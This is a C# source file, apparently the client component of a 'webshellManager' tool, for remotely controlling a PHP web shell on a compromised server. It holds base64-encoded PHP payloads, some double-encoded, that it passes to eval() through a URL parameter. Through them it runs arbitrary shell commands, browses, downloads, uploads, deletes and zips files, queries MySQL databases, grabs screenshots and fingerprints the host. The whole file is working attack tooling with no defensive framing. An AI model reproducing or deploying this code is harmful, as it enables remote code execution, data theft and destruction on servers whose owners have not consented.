using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace webshellManager
{
    [Serializable]
    public class Webshell
    {
        private string URL;
        private string variable;
        private string directorySeparator = "/";

        [NonSerialized]
        private WebClient client;

        //b64 encoded payload
        private const string BASICINFORMATION = "ZWNobyAiLcKkLSIuQHBocF91bmFtZShzKS4iLcKkLS3CpC0iLkBwaHBfdW5hbWUobikuIi3CpC0twqQtIi5AcGhwX3VuYW1lKHIpLiItwqQtLcKkLSIuJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddLiItwqQtLcKkLSIuRElSRUNUT1JZX1NFUEFSQVRPUi4iLcKkLSI7";
        private const string INFORMATION = "ZWNobyAiLcKkLSIuQHBocF91bmFtZShzKS4iLcKkLS3CpC0iLkBwaHBfdW5hbWUobikuIi3CpC0twqQtIi5AcGhwX3VuYW1lKHIpLiItwqQtLcKkLSIuQHBocF91bmFtZSh2KS4iLcKkLS3CpC0iLkBwaHBfdW5hbWUobSkuIi3CpC0twqQtIi4kX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4iLcKkLS3CpC0iLiRfU0VSVkVSWydTRVJWRVJfQUREUiddLiItwqQtLcKkLSIuJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddLiItwqQtLcKkLSIuJF9TRVJWRVJbJ1NFUlZFUl9QUk9UT0NPTCddLiItwqQtLcKkLSIuJF9TRVJWRVJbJ1JFUVVFU1RfVElNRSddLiItwqQtLcKkLSIuJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4iLcKkLS3CpC0iLiRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXS4iLcKkLS3CpC0iLiRfU0VSVkVSWydTRVJWRVJfQURNSU4nXS4iLcKkLS3CpC0iLnBocHZlcnNpb24oKS4iLcKkLSI7";
        private const string SHELL = "JGMgPSBiYXNlNjRfZGVjb2RlKCRfR0VUWyJjIl0pOyAkbCA9IGRpcm5hbWUoX19GSUxFX18pIC4gIi9zaGNtZC50eHQiOyBpZiAoUEhQX09TID09ICdXSU5OVCcgfHwgUEhQX09TID09ICdXSU4zMicgfHwgUEhQX09TID09ICdXaW5kb3dzJykgeyBzaGVsbF9leGVjKCRjIC4gIj4iIC4gJGwpOyAkbyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRsKTsgaWYgKGZpbGVfZXhpc3RzKCRsKSkgdW5saW5rKCRsKTsgfSBlbHNlIHsgJG8gPSBzaGVsbF9leGVjKCRjKTsgfSBlY2hvICItwqQtIiAuICRvIC4gIi3CpC0iOw==";
        private const string BROWSE = "JGQ9bmV3IERpcmVjdG9yeUl0ZXJhdG9yKGJhc2U2NF9kZWNvZGUoJF9HRVRbJ2MnXSkpO2ZvcmVhY2goJGQgYXMgJGspe2lmKCRrLT5pc1JlYWRhYmxlKCk9PWZhbHNlIG9yICRrLT5pc0RvdCgpKWNvbnRpbnVlO2lmKCRrLT5nZXRUeXBlKCk9PSJkaXIiKSR2YXI9JiRmb2xkZXI7ZWxzZSAkdmFyPSYkZmlsZTskdmFyLj0iLWl0bS0twqQtIi51dGY4X2VuY29kZSgieyRrfSIpLiItwqQtLcKkLSIuJGstPmdldFNpemUoKS4iLcKkLS3CpC0iLkBzdWJzdHIoc3ByaW50ZignJW8nLCRrLT5nZXRQZXJtcygpKSwtNCkuIi3CpC0twqQtIi5kYXRlKCdtL2QvWSBoOm06cycsJGstPmdldE1UaW1lKCkpLiItwqQtLcKkLSIuQG1pbWVfY29udGVudF90eXBlKCRrLT5nZXRSZWFsUGF0aCgpKS4iLcKkLS1pdG0tIjt9ZWNobyAiLXB0aMKkLSIucmVhbHBhdGgoYmFzZTY0X2RlY29kZSgkX0dFVFsnYyddKSkuIi1wdGjCpC0iLiItZmlsZcKkLSIuJGZpbGUuIi1maWxlwqQtIi4iLWZvbGRlcsKkLSIuJGZvbGRlci4iLWZvbGRlcsKkLSI7";
        private const string FILEINFO = "JGM9YmFzZTY0X2RlY29kZSgkX0dFVFsnYyddKTtlY2hvICItwqQtIi5kYXRlKCJkLW0tWSBIOmk6cyIsZmlsZWF0aW1lKCRjKSkuIi3CpC0twqQtIi5kYXRlKCJkLW0tWSBIOmk6cyIsZmlsZWN0aW1lKCRjKSkuIi3CpC0twqQtIi5kYXRlKCJkLW0tWSBIOmk6cyIsZmlsZW10aW1lKCRjKSkuIi3CpC0twqQtIi5maWxlc2l6ZSgkYykuIi3CpC0twqQtIi5taW1lX2NvbnRlbnRfdHlwZSgkYykuIi3CpC0iOw==";
        private const string MKDIR = "bWtkaXIoaWNvbnYoIlVURi04IiwgIkNQMTI1MiIsIGJhc2U2NF9kZWNvZGUoJF9HRVRbImMiXSkpKTs=";
        private const string DELETE = "JGw9aWNvbnYoIlVURi04IiwiQ1AxMjUyIixiYXNlNjRfZGVjb2RlKCRfR0VUWyJjIl0pKTtpZihpc19kaXIoJGwpKXtpZihQSFBfT1M9PT0nV2luZG93cycpe2V4ZWMoJ3JtZGlyIC1yZiAiJy4kbC4nIicpO31lbHNle2V4ZWMoJ3JkIC9zIC9xICInLiRsLiciJyk7fX1lbHNle3VubGluaygkbCk7fQ==";
        private const string RENAME = "cmVuYW1lKGljb252KCJVVEYtOCIsIkNQMTI1MiIsYmFzZTY0X2RlY29kZSgkX0dFVFsiYyJdKSksaWNvbnYoIlVURi04IiwiQ1AxMjUyIixiYXNlNjRfZGVjb2RlKCRfR0VUWyJkIl0pKSk7";
        private const string UPLOAD = "ZmlsZV9wdXRfY29udGVudHMoaWNvbnYoIlVURi04IiwgIkNQMTI1MiIsIGJhc2U2NF9kZWNvZGUoJF9HRVRbImQiXSkpLCBmaWxlX2dldF9jb250ZW50cyhiYXNlNjRfZGVjb2RlKCRfR0VUWyJjIl0pKSk7";
        private const string DOWNLOAD = "ZWNobyAiLcKkLSIuYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cyhpY29udigiVVRGLTgiLCAiQ1AxMjUyIiwgYmFzZTY0X2RlY29kZSgkX0dFVFsiYyJdKSkpKS4iLcKkLSI7";
        private const string SCREENSHOT = "JGltPWltYWdlZ3JhYnNjcmVlbigpO29iX3N0YXJ0KCk7aW1hZ2VwbmcoJGltKTskaW1hZ2VkYXRhPW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gIi1pdG0tIi5iYXNlNjRfZW5jb2RlKCRpbWFnZWRhdGEpLiItaXRtLSI7";
        //b64 encoded x2
        private const string SQL = "SkdFOVlYSnlZWGtvS1Rza1lqMXRlWE54YkdsZlkyOXVibVZqZENoaVlYTmxOalJmWkdWamIyUmxLQ1JmUjBWVVd5SmpJbDBwTEdKaApjMlUyTkY5a1pXTnZaR1VvSkY5SFJWUmJJbVFpWFNrc1ltRnpaVFkwWDJSbFkyOWtaU2drWDBkRlZGc2laU0pkS1N4aVlYTmxOalJmClpHVmpiMlJsS0NSZlIwVlVXeUptSWwwcEtUc2taVDF0ZVhOeGJHbGZjWFZsY25rb0pHSXNZbUZ6WlRZMFgyUmxZMjlrWlNna1gwZEYKVkZzaVp5SmRLU2s3ZDJocGJHVW9KSEp2ZHowa1pTMCtabVYwWTJoZllYSnlZWGtvVFZsVFVVeEpYMEZUVTA5REtTbGhjbkpoZVY5dwpkWE5vS0NSaExDUnliM2NwTzJadmNtVmhZMmdvWVhKeVlYbGZhMlY1Y3lna1lWc3dYU2xoY3lBa2F5bGxZMmh2SUNjdFkyOXN3cVF0Ckp5NGtheTRuTFdOdmJNS2tMU2M3Wm05eVpXRmphQ2drWVNCaGN5QWtiR2x1WlNsN1pXTm9ieUFuTGNLa0xTYzdabTl5WldGamFDaGgKY25KaGVWOTJZV3gxWlhNb0pHeHBibVVwWVhNZ0pHbDBiU2xsWTJodklDY3RhWFJ0d3FRdEp5NGthWFJ0TGljdGFYUnR3cVF0Snp0bApZMmh2SUNjdHdxUXRKenQ5";
        private const string ZIP = "SkhBOWFXTnZibllvSWxWVVJpMDRJaXdpUTFBeE1qVXlJaXhpWVhObE5qUmZaR1ZqYjJSbEtDUmZSMFZVV3lKaklsMHBLVHNrY0hvOWFXTnZibllvSWxWVVJpMDRJaXdpUTFBeE1qVXlJaXhpWVhObE5qUmZaR1ZqYjJSbEtDUmZSMFZVV3lKaklsMHBLUzRpTGxwSlVDSTdKSG85Ym1WM0lGcHBjRUZ5WTJocGRtVTdhV1lvSkhvdFBtOXdaVzRvSkhCNkxGcHBjRUZ5WTJocGRtVTZPa05TUlVGVVJTazlQVDFVVWxWRktYdHBaaWhwYzE5a2FYSW9KSEFwS1hza1ptWTlibVYzSUZKbFkzVnljMmwyWlVsMFpYSmhkRzl5U1hSbGNtRjBiM0lvYm1WM0lGSmxZM1Z5YzJsMlpVUnBjbVZqZEc5eWVVbDBaWEpoZEc5eUtDUndLU3hTWldOMWNuTnBkbVZKZEdWeVlYUnZja2wwWlhKaGRHOXlPanBNUlVGV1JWTmZUMDVNV1NrN1ptOXlaV0ZqYUNna1ptWWdZWE1nSkc1aGJXVTlQaVJtS1h0cFppZ2hKR1l0UG1selJHbHlLQ2twZXlSbWNEMGtaaTArWjJWMFVtVmhiRkJoZEdnb0tUc2tjbkE5YzNWaWMzUnlLQ1JtY0N4emRISnNaVzRvSkhBcEt6RXBPeVI2TFQ1aFpHUkdhV3hsS0NSbWNDd2tjbkFwTzMxOWZXVnNjMlY3SkhvdFBtRmtaRVpwYkdVb0pIQXNZbUZ6Wlc1aGJXVW9KSEFwS1R0OUpIb3RQbU5zYjNObEtDazdmV1ZqYUc4Z0pIQjZPdz09";

        public Webshell(string address, string pVariable)
        {
            this.URL = address;
            this.variable = pVariable;
            this.client = new WebClient();
            client.Encoding = Encoding.UTF8;
        }

        public IDictionary<string, string> querybasicalInformation()
        {
            IDictionary<string, string> informations = new Dictionary<string, string>();
            string result = client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + BASICINFORMATION + "\"));");
            MatchCollection matched = Regex.Matches(result, "-¤-(.*?)-¤-", RegexOptions.Singleline);
            informations["OS"] = matched[0].Groups[1].Value;
            informations["Hostname"] = matched[1].Groups[1].Value;
            informations["Release Name"] = matched[2].Groups[1].Value;
            informations["Server Software"] = matched[3].Groups[1].Value;
            this.directorySeparator = matched[4].Groups[1].Value;
            return informations;
        }

        public IDictionary<string, string> queryInformation(string pUrl, string pParam)
        {
            IDictionary<string, string> informations = new Dictionary<string, string>();
            string result = client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + INFORMATION + "\"));");
            MatchCollection matched = Regex.Matches(result, "-¤-(.*?)-¤-", RegexOptions.Singleline);
            informations["OS"] = matched[0].Groups[1].Value;
            informations["Hostname"] = matched[1].Groups[1].Value;
            informations["Release Name"] = matched[2].Groups[1].Value;
            informations["Version Information"] = matched[3].Groups[1].Value;
            informations["Machine type"] = matched[4].Groups[1].Value;
            informations["Server Name"] = matched[5].Groups[1].Value;
            informations["Server Address"] = matched[6].Groups[1].Value;
            informations["Server Software"] = matched[7].Groups[1].Value;
            informations["Server Protocol"] = matched[8].Groups[1].Value;
            informations["Request Time"] = matched[9].Groups[1].Value;
            informations["Document Root"] = matched[10].Groups[1].Value;
            informations["Script FileName"] = matched[11].Groups[1].Value;
            informations["Server Admin"] = matched[12].Groups[1].Value;
            informations["PHP version"] = matched[13].Groups[1].Value;
            return informations;
        }

        public Tuple<List<Folder>, List<File>, string> browse(string path)
        {
            List<Folder> folders = new List<Folder>();
            List<File> files = new List<File>();
            var bPath = System.Text.Encoding.UTF8.GetBytes(path);
            path = System.Convert.ToBase64String(bPath);
            string result = client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + BROWSE + "\"));&c=" + path);
            MatchCollection allMatchedFiles = Regex.Matches(result, "-file¤-(.*?)-file¤-");
            MatchCollection allMatchedFolders = Regex.Matches(result, "-folder¤(.*?)-folder¤");
            MatchCollection Matchedpath = Regex.Matches(result, "-pth¤-(.*?)-pth¤-");
            if (allMatchedFiles.Count > 0)
            {
                MatchCollection MatchedFiles = Regex.Matches(allMatchedFiles[0].Groups[1].Value, "-itm-(.*?)-itm-");
                for (int i = 0; i < MatchedFiles.Count; i++) // get all files information in the directory
                {
                    MatchCollection matchedfileInformation = Regex.Matches(MatchedFiles[i].Groups[1].Value, "-¤-(.*?)-¤-", RegexOptions.Singleline);
                    files.Add(new File(matchedfileInformation[0].Groups[1].Value, matchedfileInformation[1].Groups[1].Value, matchedfileInformation[2].Groups[1].Value, matchedfileInformation[3].Groups[1].Value, matchedfileInformation[4].Groups[1].Value));
                }
            }
            if (allMatchedFolders.Count > 0)
            {
                MatchCollection MatchedFolders = Regex.Matches(allMatchedFolders[0].Groups[1].Value, "-itm-(.*?)-itm-");
                for (int i = 0; i < MatchedFolders.Count; i++) // get all folders information in the directory
                {
                    MatchCollection matchedfolderInformation = Regex.Matches(MatchedFolders[i].Groups[1].Value, "-¤-(.*?)-¤-", RegexOptions.Singleline);
                    folders.Add(new Folder(matchedfolderInformation[0].Groups[1].Value, matchedfolderInformation[1].Groups[1].Value, matchedfolderInformation[2].Groups[1].Value));
                }
            }
            if (Matchedpath.Count > 0) path = Matchedpath[0].Groups[1].Value;
            return Tuple.Create(folders, files, path);
        }

        public IDictionary<string, string> fileInformation(string path)
        {
            IDictionary<string, string> informations = new Dictionary<string, string>();
            var bPath = System.Text.Encoding.UTF8.GetBytes(path);
            path = System.Convert.ToBase64String(bPath);
            string result = client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + FILEINFO + "\"));&c=" + path);
            MatchCollection matched = Regex.Matches(result, "-¤-(.*?)-¤-", RegexOptions.Singleline);
            informations["Last access"] = matched[0].Groups[1].Value;
            informations["Last change"] = matched[1].Groups[1].Value;
            informations["Last modified"] = matched[2].Groups[1].Value;
            informations["Size"] = matched[3].Groups[1].Value;
            informations["Mime content type"] = matched[4].Groups[1].Value;
            return informations;
        }

        public Tuple<List<String>, List<List<String>>> SQLrequest(string host, string login, string password, string db, string query)
        {
            List<String> column = new List<string>();
            List<List<String>> content = new List<List<String>>();
            host = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(host));
            login = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(login));
            password = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(password));
            db = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(db));
            query = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(query));
            string result = client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(base64_decode(\"" + SQL + "\")));&c=" + host + "&d=" + login + "&e=" + password + "&f=" + db + "&g=" + query);
            Console.WriteLine(this.URL + "?" + this.variable + "=eval(base64_decode(base64_decode(\"" + SQL + "\")));&c=" + host + "&d=" + login + "&e=" + password + "&f=" + db + "&g=" + query);
            MatchCollection matchedColumns = Regex.Matches(result, "-col¤-(.*?)-col¤-");
            MatchCollection matchedLines = Regex.Matches(result, "-¤-(.*?)-¤-");

            for (int i = 0; i < matchedColumns.Count; i++) // get all columns
            {
                column.Add(matchedColumns[i].Groups[1].Value);
            }

            for (int i = 0; i < matchedLines.Count; i++) // get all lines
            {
                List<String> items = new List<string>();
                MatchCollection matchedItems = Regex.Matches(matchedLines[i].Groups[1].Value, "-itm¤-(.*?)-itm¤-");
                for (int j = 0; j < matchedItems.Count; j++) // get all items per line
                {
                    items.Add(matchedItems[j].Groups[1].Value);
                }
                content.Add(items);
            }

            return Tuple.Create(column, content);
        }

        public Bitmap takeScreenshot()
        {
            String result=client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + SCREENSHOT + "\"));");
            MatchCollection matchedColumns = Regex.Matches(result, "-itm-(.*?)-itm-");
            byte[] imageBytes = Convert.FromBase64String(matchedColumns[0].Groups[1].Value);
            using (var ms = new MemoryStream(imageBytes, 0, imageBytes.Length))
            {
                return (Bitmap)Image.FromStream(ms, true);
            }
        }

        public void newDir(string path)
        {
            var bPath = System.Text.Encoding.UTF8.GetBytes(path);
            path = System.Convert.ToBase64String(bPath);
            client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + MKDIR + "\"));&c=" + path);
        }

        public void delete(string path)
        {
            var bPath = System.Text.Encoding.UTF8.GetBytes(path);
            path = System.Convert.ToBase64String(bPath);
            client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + DELETE + "\"));&c=" + path);
        }

        public void rename(string path, string npath)
        {
            var bPath = System.Text.Encoding.UTF8.GetBytes(path);
            var bNPath = System.Text.Encoding.UTF8.GetBytes(npath);
            path = System.Convert.ToBase64String(bPath);
            npath = System.Convert.ToBase64String(bNPath);
            client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + RENAME + "\"));&c=" + path + "&d=" + npath);
        }

        public void zip(string path)
        {
            var filePath = System.Text.Encoding.UTF8.GetBytes(path);
            path = System.Convert.ToBase64String(filePath);
            client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(base64_decode(\"" + ZIP + "\")));&c=" + path);
        }

        public void upload(string url, string path)
        {
            var bPath = System.Text.Encoding.UTF8.GetBytes(path);
            path = System.Convert.ToBase64String(bPath);
            var pUrl = System.Text.Encoding.UTF8.GetBytes(url);
            url = System.Convert.ToBase64String(pUrl);
            client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + UPLOAD + "\"));&c=" + url + "&d=" + path);
        }

        public byte[] download(string path)
        {
            var bPath = System.Text.Encoding.UTF8.GetBytes(path);
            path = System.Convert.ToBase64String(bPath);
            string result = client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + DOWNLOAD + "\"));&c=" + path);
            MatchCollection matched = Regex.Matches(result, "-¤-(.*?)-¤-", RegexOptions.Singleline);
            return Convert.FromBase64String(matched[0].Groups[1].Value);
        }

        public string shellexec(string command)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(command);
            command = System.Convert.ToBase64String(plainTextBytes);
            string result = client.DownloadString(this.URL + "?" + this.variable + "=eval(base64_decode(\"" + SHELL + "\"));&c=" + command);
            MatchCollection matched = Regex.Matches(result, "-¤-(.*?)-¤-", RegexOptions.Singleline);
            return (matched[0].Groups[1].Value);
        }

        public void setUrl(string pAddress)
        {
            this.URL = pAddress;
        }

        public void setVariable(string pVariable)
        {
            this.variable = pVariable;
        }

        public string getUrl()
        {
            return this.URL;
        }

        public void setWebClient(WebClient wc)
        {
            this.client = wc;
            wc.Encoding = Encoding.UTF8;
        }

        public string getParam()
        {
            return this.variable;
        }

        public string getDirectorySeparator()
        {
            return this.directorySeparator;
        }
    }
}